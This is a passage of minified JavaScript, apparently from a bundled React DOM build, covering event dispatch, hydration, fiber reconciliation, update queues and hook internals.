e;if((g||f)&&(f=u.window===u?u:(f=u.ownerDocument)?f.defaultView||f.parentWindow:window,g?(k=t.relatedTarget||t.toElement,g=c,k=k?Qn(k):null,k!==null&&(w=dt(k),k!==w||k.tag!==5&&k.tag!==6)&&(k=null)):(g=null,k=c),g!==k)){if(y=Bo,v="onMouseLeave",d="onMouseEnter",p="mouse",(e==="pointerout"||e==="pointerover")&&(y=Uo,v="onPointerLeave",d="onPointerEnter",p="pointer"),w=g==null?f:kt(g),m=k==null?f:kt(k),f=new y(v,p+"leave",g,t,u),f.target=w,f.relatedTarget=m,v=null,Qn(u)===c&&(y=new y(d,p+"enter",k,t,u),y.target=m,y.relatedTarget=w,v=y),w=v,g&&k)n:{for(y=g,d=k,p=0,m=y;m;m=ft(m))p++;for(m=0,v=d;v;v=ft(v))m++;for(;0<p-m;)y=ft(y),p--;for(;0<m-p;)d=ft(d),m--;for(;p--;){if(y===d||d!==null&&y===d.alternate)break n;y=ft(y),d=ft(d)}y=null}else y=null;g!==null&&Zo(h,f,g,y,!1),k!==null&&w!==null&&Zo(h,w,k,y,!0)}}e:{if(f=c?kt(c):window,g=f.nodeName&&f.nodeName.toLowerCase(),g==="select"||g==="input"&&f.type==="file")var x=jf;else if(Wo(f))if(lp)x=Hf;else{x=Ff;var T=Bf}else(g=f.nodeName)&&g.toLowerCase()==="input"&&(f.type==="checkbox"||f.type==="radio")&&(x=Uf);if(x&&(x=x(e,c))){ap(h,x,t,u);break e}T&&T(e,f,c),e==="focusout"&&(T=f._wrapperState)&&T.controlled&&f.type==="number"&&ya(f,"number",f.value)}switch(T=c?kt(c):window,e){case"focusin":(Wo(T)||T.contentEditable==="true")&&(vt=T,Pa=c,ms=null);break;case"focusout":ms=Pa=vt=null;break;case"mousedown":Na=!0;break;case"contextmenu":case"mouseup":case"dragend":Na=!1,Xo(h,t,u);break;case"selectionchange":if($f)break;case"keydown":case"keyup":Xo(h,t,u)}var P;if(Rl)e:{switch(e){case"compositionstart":var N="onCompositionStart";break e;case"compositionend":N="onCompositionEnd";break e;case"compositionupdate":N="onCompositionUpdate";break e}N=void 0}else yt?rp(e,t)&&(N="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(N="onCompositionStart");N&&(sp&&t.locale!=="ko"&&(yt||N!=="onCompositionStart"?N==="onCompositionEnd"&&yt&&(P=tp()):(Pn=u,Pl="value"in Pn?Pn.value:Pn.textContent,yt=!0)),T=Hr(c,N),0<T.length&&(N=new Fo(N,e,null,t,u),h.push({event:N,listeners:T}),P?N.data=P:(P=ip(t),P!==null&&(N.data=P)))),(P=Of?Mf(e,t):If(e,t))&&(c=Hr(c,"onBeforeInput"),0<c.length&&(u=new Fo("onBeforeInput","beforeinput",null,t,u),h.push({event:u,listeners:c}),u.data=P))}yp(h,n)})}function Ps(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Hr(e,n){for(var t=n+"Capture",s=[];e!==null;){var r=e,i=r.stateNode;r.tag===5&&i!==null&&(r=i,i=xs(e,t),i!=null&&s.unshift(Ps(e,i,r)),i=xs(e,n),i!=null&&s.push(Ps(e,i,r))),e=e.return}return s}function ft(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Zo(e,n,t,s,r){for(var i=n._reactName,a=[];t!==null&&t!==s;){var l=t,o=l.alternate,c=l.stateNode;if(o!==null&&o===s)break;l.tag===5&&c!==null&&(l=c,r?(o=xs(t,i),o!=null&&a.unshift(Ps(t,o,l))):r||(o=xs(t,i),o!=null&&a.push(Ps(t,o,l)))),t=t.return}a.length!==0&&e.push({event:n,listeners:a})}var Xf=/\r\n?/g,Kf=/\u0000|\uFFFD/g;function Jo(e){return(typeof e=="string"?e:""+e).replace(Xf,`
`).replace(Kf,"")}function or(e,n,t){if(n=Jo(n),Jo(e)!==n&&t)throw Error(C(425))}function Vr(){}var La=null,Ra=null;function Oa(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Ma=typeof setTimeout=="function"?setTimeout:void 0,Qf=typeof clearTimeout=="function"?clearTimeout:void 0,ec=typeof Promise=="function"?Promise:void 0,Zf=typeof queueMicrotask=="function"?queueMicrotask:typeof ec<"u"?function(e){return ec.resolve(null).then(e).catch(Jf)}:Ma;function Jf(e){setTimeout(function(){throw e})}function Ki(e,n){var t=n,s=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(s===0){e.removeChild(r),Es(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=r}while(t);Es(n)}function zn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function nc(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Yt=Math.random().toString(36).slice(2),nn="__reactFiber$"+Yt,Ns="__reactProps$"+Yt,yn="__reactContainer$"+Yt,Ia="__reactEvents$"+Yt,em="__reactListeners$"+Yt,nm="__reactHandles$"+Yt;function Qn(e){var n=e[nn];if(n)return n;for(var t=e.parentNode;t;){if(n=t[yn]||t[nn]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=nc(e);e!==null;){if(t=e[nn])return t;e=nc(e)}return n}e=t,t=e.parentNode}return null}function Gs(e){return e=e[nn]||e[yn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function kt(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(C(33))}function yi(e){return e[Ns]||null}var za=[],bt=-1;function $n(e){return{current:e}}function G(e){0>bt||(e.current=za[bt],za[bt]=null,bt--)}function V(e,n){bt++,za[bt]=e.current,e.current=n}var Vn={},ge=$n(Vn),Ae=$n(!1),it=Vn;function Dt(e,n){var t=e.type.contextTypes;if(!t)return Vn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var r={},i;for(i in t)r[i]=n[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function Pe(e){return e=e.childContextTypes,e!=null}function Wr(){G(Ae),G(ge)}function tc(e,n,t){if(ge.current!==Vn)throw Error(C(168));V(ge,n),V(Ae,t)}function wp(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var r in s)if(!(r in n))throw Error(C(108,jh(e)||"Unknown",r));return K({},t,s)}function $r(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Vn,it=ge.current,V(ge,e),V(Ae,Ae.current),!0}function sc(e,n,t){var s=e.stateNode;if(!s)throw Error(C(169));t?(e=wp(e,n,it),s.__reactInternalMemoizedMergedChildContext=e,G(Ae),G(ge),V(ge,e)):G(Ae),V(Ae,t)}var un=null,vi=!1,Qi=!1;function kp(e){un===null?un=[e]:un.push(e)}function tm(e){vi=!0,kp(e)}function Gn(){if(!Qi&&un!==null){Qi=!0;var e=0,n=H;try{var t=un;for(H=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}un=null,vi=!1}catch(r){throw un!==null&&(un=un.slice(e+1)),$u(El,Gn),r}finally{H=n,Qi=!1}}return null}var xt=[],_t=0,Gr=null,Yr=0,je=[],Be=0,at=null,dn=1,hn="";function Xn(e,n){xt[_t++]=Yr,xt[_t++]=Gr,Gr=e,Yr=n}function bp(e,n,t){je[Be++]=dn,je[Be++]=hn,je[Be++]=at,at=e;var s=dn;e=hn;var r=32-Xe(s)-1;s&=~(1<<r),t+=1;var i=32-Xe(n)+r;if(30<i){var a=r-r%5;i=(s&(1<<a)-1).toString(32),s>>=a,r-=a,dn=1<<32-Xe(n)+r|t<<r|s,hn=i+e}else dn=1<<i|t<<r|s,hn=e}function Ml(e){e.return!==null&&(Xn(e,1),bp(e,1,0))}function Il(e){for(;e===Gr;)Gr=xt[--_t],xt[_t]=null,Yr=xt[--_t],xt[_t]=null;for(;e===at;)at=je[--Be],je[Be]=null,hn=je[--Be],je[Be]=null,dn=je[--Be],je[Be]=null}var Oe=null,Re=null,Y=!1,Ye=null;function xp(e,n){var t=Fe(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function rc(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,Oe=e,Re=zn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,Oe=e,Re=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=at!==null?{id:dn,overflow:hn}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Fe(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,Oe=e,Re=null,!0):!1;default:return!1}}function Da(e){return(e.mode&1)!==0&&(e.flags&128)===0}function ja(e){if(Y){var n=Re;if(n){var t=n;if(!rc(e,n)){if(Da(e))throw Error(C(418));n=zn(t.nextSibling);var s=Oe;n&&rc(e,n)?xp(s,t):(e.flags=e.flags&-4097|2,Y=!1,Oe=e)}}else{if(Da(e))throw Error(C(418));e.flags=e.flags&-4097|2,Y=!1,Oe=e}}}function ic(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Oe=e}function cr(e){if(e!==Oe)return!1;if(!Y)return ic(e),Y=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Oa(e.type,e.memoizedProps)),n&&(n=Re)){if(Da(e))throw _p(),Error(C(418));for(;n;)xp(e,n),n=zn(n.nextSibling)}if(ic(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(C(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Re=zn(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Re=null}}else Re=Oe?zn(e.stateNode.nextSibling):null;return!0}function _p(){for(var e=Re;e;)e=zn(e.nextSibling)}function jt(){Re=Oe=null,Y=!1}function zl(e){Ye===null?Ye=[e]:Ye.push(e)}var sm=bn.ReactCurrentBatchConfig;function es(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(C(309));var s=t.stateNode}if(!s)throw Error(C(147,e));var r=s,i=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===i?n.ref:(n=function(a){var l=r.refs;a===null?delete l[i]:l[i]=a},n._stringRef=i,n)}if(typeof e!="string")throw Error(C(284));if(!t._owner)throw Error(C(290,e))}return e}function ur(e,n){throw e=Object.prototype.toString.call(n),Error(C(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function ac(e){var n=e._init;return n(e._payload)}function Sp(e){function n(d,p){if(e){var m=d.deletions;m===null?(d.deletions=[p],d.flags|=16):m.push(p)}}function t(d,p){if(!e)return null;for(;p!==null;)n(d,p),p=p.sibling;return null}function s(d,p){for(d=new Map;p!==null;)p.key!==null?d.set(p.key,p):d.set(p.index,p),p=p.sibling;return d}function r(d,p){return d=Fn(d,p),d.index=0,d.sibling=null,d}function i(d,p,m){return d.index=m,e?(m=d.alternate,m!==null?(m=m.index,m<p?(d.flags|=2,p):m):(d.flags|=2,p)):(d.flags|=1048576,p)}function a(d){return e&&d.alternate===null&&(d.flags|=2),d}function l(d,p,m,v){return p===null||p.tag!==6?(p=ra(m,d.mode,v),p.return=d,p):(p=r(p,m),p.return=d,p)}function o(d,p,m,v){var x=m.type;return x===gt?u(d,p,m.props.children,v,m.key):p!==null&&(p.elementType===x||typeof x=="object"&&x!==null&&x.$$typeof===Sn&&ac(x)===p.type)?(v=r(p,m.props),v.ref=es(d,p,m),v.return=d,v):(v=Nr(m.type,m.key,m.props,null,d.mode,v),v.ref=es(d,p,m),v.return=d,v)}function c(d,p,m,v){return p===null||p.tag!==4||p.stateNode.containerInfo!==m.containerInfo||p.stateNode.implementation!==m.implementation?(p=ia(m,d.mode,v),p.return=d,p):(p=r(p,m.children||[]),p.return=d,p)}function u(d,p,m,v,x){return p===null||p.tag!==7?(p=tt(m,d.mode,v,x),p.return=d,p):(p=r(p,m),p.return=d,p)}function h(d,p,m){if(typeof p=="string"&&p!==""||typeof p=="number")return p=ra(""+p,d.mode,m),p.return=d,p;if(typeof p=="object"&&p!==null){switch(p.$$typeof){case Js:return m=Nr(p.type,p.key,p.props,null,d.mode,m),m.ref=es(d,null,p),m.return=d,m;case mt:return p=ia(p,d.mode,m),p.return=d,p;case Sn:var v=p._init;return h(d,v(p._payload),m)}if(as(p)||Xt(p))return p=tt(p,d.mode,m,null),p.return=d,p;ur(d,p)}return null}function f(d,p,m,v){var x=p!==null?p.key:null;if(typeof m=="string"&&m!==""||typeof m=="number")return x!==null?null:l(d,p,""+m,v);if(typeof m=="object"&&m!==null){switch(m.$$typeof){case Js:return m.key===x?o(d,p,m,v):null;case mt:return m.key===x?c(d,p,m,v):null;case Sn:return x=m._init,f(d,p,x(m._payload),v)}if(as(m)||Xt(m))return x!==null?null:u(d,p,m,v,null);ur(d,m)}return null}function g(d,p,m,v,x){if(typeof v=="string"&&v!==""||typeof v=="number")return d=d.get(m)||null,l(p,d,""+v,x);if(typeof v=="object"&&v!==null){switch(v.$$typeof){case Js:return d=d.get(v.key===null?m:v.key)||null,o(p,d,v,x);case mt:return d=d.get(v.key===null?m:v.key)||null,c(p,d,v,x);case Sn:var T=v._init;return g(d,p,m,T(v._payload),x)}if(as(v)||Xt(v))return d=d.get(m)||null,u(p,d,v,x,null);ur(p,v)}return null}function k(d,p,m,v){for(var x=null,T=null,P=p,N=p=0,j=null;P!==null&&N<m.length;N++){P.index>N?(j=P,P=null):j=P.sibling;var M=f(d,P,m[N],v);if(M===null){P===null&&(P=j);break}e&&P&&M.alternate===null&&n(d,P),p=i(M,p,N),T===null?x=M:T.sibling=M,T=M,P=j}if(N===m.length)return t(d,P),Y&&Xn(d,N),x;if(P===null){for(;N<m.length;N++)P=h(d,m[N],v),P!==null&&(p=i(P,p,N),T===null?x=P:T.sibling=P,T=P);return Y&&Xn(d,N),x}for(P=s(d,P);N<m.length;N++)j=g(P,d,N,m[N],v),j!==null&&(e&&j.alternate!==null&&P.delete(j.key===null?N:j.key),p=i(j,p,N),T===null?x=j:T.sibling=j,T=j);return e&&P.forEach(function(Q){return n(d,Q)}),Y&&Xn(d,N),x}function y(d,p,m,v){var x=Xt(m);if(typeof x!="function")throw Error(C(150));if(m=x.call(m),m==null)throw Error(C(151));for(var T=x=null,P=p,N=p=0,j=null,M=m.next();P!==null&&!M.done;N++,M=m.next()){P.index>N?(j=P,P=null):j=P.sibling;var Q=f(d,P,M.value,v);if(Q===null){P===null&&(P=j);break}e&&P&&Q.alternate===null&&n(d,P),p=i(Q,p,N),T===null?x=Q:T.sibling=Q,T=Q,P=j}if(M.done)return t(d,P),Y&&Xn(d,N),x;if(P===null){for(;!M.done;N++,M=m.next())M=h(d,M.value,v),M!==null&&(p=i(M,p,N),T===null?x=M:T.sibling=M,T=M);return Y&&Xn(d,N),x}for(P=s(d,P);!M.done;N++,M=m.next())M=g(P,d,N,M.value,v),M!==null&&(e&&M.alternate!==null&&P.delete(M.key===null?N:M.key),p=i(M,p,N),T===null?x=M:T.sibling=M,T=M);return e&&P.forEach(function(pe){return n(d,pe)}),Y&&Xn(d,N),x}function w(d,p,m,v){if(typeof m=="object"&&m!==null&&m.type===gt&&m.key===null&&(m=m.props.children),typeof m=="object"&&m!==null){switch(m.$$typeof){case Js:e:{for(var x=m.key,T=p;T!==null;){if(T.key===x){if(x=m.type,x===gt){if(T.tag===7){t(d,T.sibling),p=r(T,m.props.children),p.return=d,d=p;break e}}else if(T.elementType===x||typeof x=="object"&&x!==null&&x.$$typeof===Sn&&ac(x)===T.type){t(d,T.sibling),p=r(T,m.props),p.ref=es(d,T,m),p.return=d,d=p;break e}t(d,T);break}else n(d,T);T=T.sibling}m.type===gt?(p=tt(m.props.children,d.mode,v,m.key),p.return=d,d=p):(v=Nr(m.type,m.key,m.props,null,d.mode,v),v.ref=es(d,p,m),v.return=d,d=v)}return a(d);case mt:e:{for(T=m.key;p!==null;){if(p.key===T)if(p.tag===4&&p.stateNode.containerInfo===m.containerInfo&&p.stateNode.implementation===m.implementation){t(d,p.sibling),p=r(p,m.children||[]),p.return=d,d=p;break e}else{t(d,p);break}else n(d,p);p=p.sibling}p=ia(m,d.mode,v),p.return=d,d=p}return a(d);case Sn:return T=m._init,w(d,p,T(m._payload),v)}if(as(m))return k(d,p,m,v);if(Xt(m))return y(d,p,m,v);ur(d,m)}return typeof m=="string"&&m!==""||typeof m=="number"?(m=""+m,p!==null&&p.tag===6?(t(d,p.sibling),p=r(p,m),p.return=d,d=p):(t(d,p),p=ra(m,d.mode,v),p.return=d,d=p),a(d)):t(d,p)}return w}var Bt=Sp(!0),Ep=Sp(!1),qr=$n(null),Xr=null,St=null,Dl=null;function jl(){Dl=St=Xr=null}function Bl(e){var n=qr.current;G(qr),e._currentValue=n}function Ba(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function Rt(e,n){Xr=e,Dl=St=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(Te=!0),e.firstContext=null)}function He(e){var n=e._currentValue;if(Dl!==e)if(e={context:e,memoizedValue:n,next:null},St===null){if(Xr===null)throw Error(C(308));St=e,Xr.dependencies={lanes:0,firstContext:e}}else St=St.next=e;return n}var Zn=null;function Fl(e){Zn===null?Zn=[e]:Zn.push(e)}function Tp(e,n,t,s){var r=n.interleaved;return r===null?(t.next=t,Fl(n)):(t.next=r.next,r.next=t),n.interleaved=t,vn(e,s)}function vn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var En=!1;function Ul(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Cp(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function mn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Dn(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,U&2){var r=s.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),s.pending=n,vn(e,t)}return r=s.interleaved,r===null?(n.next=n,Fl(s)):(n.next=r.next,r.next=n),s.interleaved=n,vn(e,t)}function Sr(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,Tl(e,t)}}function lc(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var r=null,i=null;if(t=t.firstBaseUpdate,t!==null){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};i===null?r=i=a:i=i.next=a,t=t.next}while(t!==null);i===null?r=i=n:i=i.next=n}else r=i=n;t={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function Kr(e,n,t,s){var r=e.updateQueue;En=!1;var i=r.firstBaseUpdate,a=r.lastBaseUpdate,l=r.shared.pending;if(l!==null){r.shared.pending=null;var o=l,c=o.next;o.next=null,a===null?i=c:a.next=c,a=o;var u=e.alternate;u!==null&&(u=u.updateQueue,l=u.lastBaseUpdate,l!==a&&(l===null?u.firstBaseUpdate=c:l.next=c,u.lastBaseUpdate=o))}if(i!==null){var h=r.baseState;a=0,u=c=o=null,l=i;do{var f=l.lane,g=l.eventTime;if((s&f)===f){u!==null&&(u=u.next={eventTime:g,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var k=e,y=l;switch(f=n,g=t,y.tag){case 1:if(k=y.payload,typeof k=="function"){h=k.call(g,h,f);break e}h=k;break e;case 3:k.flags=k.flags&-65537|128;case 0:if(k=y.payload,f=typeof k=="function"?k.call(g,h,f):k,f==null)break e;h=K({},h,f);break e;case 2:En=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,f=r.effects,f===null?r.effects=[l]:f.push(l))}else g={eventTime:g,lane:f,tag:l.tag,payload:l.payload,callback:l.callback,next:null},u===null?(c=u=g,o=h):u=u.next=g,a|=f;if(l=l.next,l===null){if(l=r.shared.pending,l===null)break;f=l,l=f.next,f.next=null,r.lastBaseUpdate=f,r.shared.pending=null}}while(!0);if(u===null&&(o=h),r.baseState=o,r.firstBaseUpdate=c,r.lastBaseUpdate=u,n=r.shared.interleaved,n!==null){r=n;do a|=r.lane,r=r.next;while(r!==n)}else i===null&&(r.shared.lanes=0);ot|=a,e.lanes=a,e.memoizedState=h}}function oc(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],r=s.callback;if(r!==null){if(s.callback=null,s=t,typeof r!="function")throw Error(C(191,r));r.call(s)}}}var Ys={},sn=$n(Ys),Ls=$n(Ys),Rs=$n(Ys);function Jn(e){if(e===Ys)throw Error(C(174));return e}function Hl(e,n){switch(V(Rs,n),V(Ls,e),V(sn,Ys),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:wa(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=wa(n,e)}G(sn),V(sn,n)}function Ft(){G(sn),G(Ls),G(Rs)}function Ap(e){Jn(Rs.current);var n=Jn(sn.current),t=wa(n,e.type);n!==t&&(V(Ls,e),V(sn,t))}function Vl(e){Ls.current===e&&(G(sn),G(Ls))}var q=$n(0);function Qr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Zi=[];function Wl(){for(var e=0;e<Zi.length;e++)Zi[e]._workInProgressVersionPrimary=null;Zi.length=0}var Er=bn.ReactCurrentDispatcher,Ji=bn.ReactCurrentBatchConfig,lt=0,X=null,te=null,re=null,Zr=!1,gs=!1,Os=0,rm=0;function he(){throw Error(C(321))}function $l(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Qe(e[t],n[t]))return!1;return!0}function Gl(e,n,t,s,r,i){if(lt=i,X=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,Er.current=e===null||e.memoizedState===null?om:cm,e=t(s,r),gs){i=0;do{if(gs=!1,Os=0,25<=i)throw Error(C(301));i+=1,re=te=null,n.updateQueue=null,Er.current=um,e=t(s,r)}while(gs)}if(Er.current=Jr,n=te!==null&&te.next!==null,lt=0,re=te=X=null,Zr=!1,n)throw Error(C(300));return e}function Yl(){var e=Os!==0;return Os=0,e}function en(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return re===null?X.memoizedState=re=e:re=re.next=e,re}function Ve(){if(te===null){var e=X.alternate;e=e!==null?e.memoizedState:null}else e=te.next;var n=re===null?X.memoizedState:re.next;if(n!==null)re=n,te=e;else{if(e===null)throw Error(C(310));te=e,e={memoizedState:te.memoizedState,baseState:te.baseState,baseQueue:te.baseQueue,queue:te.queue,next:null},re===null?X.memoizedState=re=e:re=re.next=e}return re}function Ms(e,n){return typeof n=="function"?n(e):n}function ea(e){var n=Ve(),t=n.queue;if(t===null)throw Error(C(311));t.lastRenderedReducer=e;var s=te,r=s.baseQueue,i=t.pending;if(i!==null){if(r!==null){var a=r.next;r.next=i.next,i.next=a}s.baseQueue=r=i,t.pending=null}if(r!==null){i=r.next,s=s.baseState;var l=a=null,o=null,c=i;do{var u=c.lane;if((lt&u)===u)o!==null&&(o=o.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),s=c.hasEagerState?c.eagerState:e(s,c.action);else{var h={lane:u,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};o===null?(l=o=h,a=s):o=o.next=h,X.lanes|=u,ot|=u}c=c.next}while(c!==null&&c!==i);o===null?a=s:o.next=l,Qe(s,n.memoizedState)||(Te=!0),n.memoizedState=s,n.baseState=a,n.baseQueue=o,t.lastRenderedState=s}if(e=t.interleaved,e!==null){r=e;do i=r.lane,X.lanes|=i,ot|=i,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function na(e){var n=Ve(),t=n.queue;if(t===null)throw Error(C(311));t.lastRenderedReducer=e;var s=t.dispatch,r=t.pending,i=n.memoizedState;if(r!==null){t.pending=null;var a=r=r.next;do i=e(i,a.action),a=a.next;while(a!==r);Qe(i,n.memoizedState)||(Te=!0),n.memoizedState=i,n.baseQueue===null&&(n.baseState=i),t.lastRenderedState=i}return[i,s]}function Pp(){}function Np(e,n){var t=X,s=Ve(),r=n(),i=!Qe(s.memoizedState,r);if(i&&(s.memoizedState=r,Te=!0),s=s.queue,ql(Op.bind(null,t,s,e),[e]),s.getSnapshot!==n||i||re!==null&&re.memoizedState.tag&1){if(t.flags|=2048,Is(9,Rp.bind(null,t,s,r,n),void 0,null),ie===null)throw Error(C(349));lt&30||Lp(t,n,r)}return r}function Lp(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=X.updateQueue,n===null?(n={lastEffect:null,stores:null},X.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Rp(e,n,t,s){n.value=t,n.getSnapshot=s,Mp(n)&&Ip(e)}function Op(e,n,t){return t(function(){Mp(n)&&Ip(e)})}function Mp(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Qe(e,t)}catch{return!0}}function Ip(e){var n=vn(e,1);n!==null&&Ke(n,e,1,-1)}function cc(e){var n=en();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Ms,lastRenderedState:e},n.queue=e,e=e.dispatch=lm.bind(null,X,e),[n.memoizedState,e]}function Is(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=X.updateQueue,n===null?(n={lastEffect:null,stores:null},X.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function zp(){return Ve().memoizedState}function Tr(e,n,t,s){var r=en();X.flags|=e,r.memoizedState=Is(1|n,t,void 0,s===void 0?null:s)}function wi(e,n,t,s){var r=Ve();s=s===void 0?null:s;var i=void 0;if(te!==null){var a=te.memoizedState;if(i=a.destroy,s!==null&&$l(s,a.deps)){r.memoizedState=Is(n,t,i,s);return}}X.flags|=e,r.memoizedState=Is(1|n,t,i,s)}function uc(e,n){return Tr(8390656,8,e,n)}function ql(e,n){return wi(2048,8,e,n)}function Dp(e,n){return wi(4,2,e,n)}function jp(e,n){return wi(4,4,e,n)}function Bp(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Fp(e,n,t){return t=t!=null?t.concat([e]):null,wi(4,4,Bp.bind(null,n,e),t)}function Xl(){}function Up(e,n){var t=Ve();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&$l(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Hp(e,n){var t=Ve();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&$l(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function Vp(e,n,t){return lt&21?(Qe(t,n)||(t=qu(),X.lanes|=t,ot|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,Te=!0),e.memoizedState=t)}function im(e,n){var t=H;H=t!==0&&4>t?t:4,e(!0);var s=Ji.transition;Ji.transition={};try{e(!1),n()}finally{H=t,Ji.transition=s}}function Wp(){return Ve().memoizedState}function am(e,n,t){var s=Bn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},$p(e))Gp(n,t);else if(t=Tp(e,n,t,s),t!==null){var r=be();Ke(t,e,s,r),Yp(t,n,s)}}function lm(e,n,t){var s=Bn(e),r={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if($p(e))Gp(n,r);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=n.lastRenderedReducer,i!==null))try{var 